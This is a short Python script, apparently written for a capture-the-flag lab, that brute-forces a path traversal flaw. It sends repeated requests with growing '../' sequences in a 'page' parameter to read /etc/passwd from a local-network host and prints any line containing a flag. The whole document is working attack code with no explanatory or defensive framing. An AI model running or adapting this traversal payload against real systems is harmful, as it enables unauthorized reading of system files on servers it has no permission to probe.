import requests

base_url = "http://192.168.64.2/"

for depth in range(1, 15):
    payload = "../" * depth + "etc/passwd"
    url = base_url + "?page=" + payload
    try:
        response = requests.get(url, timeout=5)
        if "Nope" in response.text:
            print(f"Depth {depth}: Nope, not deep enough yet")
        elif "Almost" in response.text:
            print(f"Depth {depth}: Almost! Getting closer...")
        elif "flag" in response.text.lower():
            print(f"Depth {depth}: FLAG FOUND!")
            print(f"Winning URL: {url}")
            for line in response.text.split('\n'):
                if 'flag' in line.lower():
                    print(line.strip())
            break
        else:
            print(f"Depth {depth}: Unknown response")
    except Exception as e:
        print(f"Depth {depth}: Error - {e}")
        break
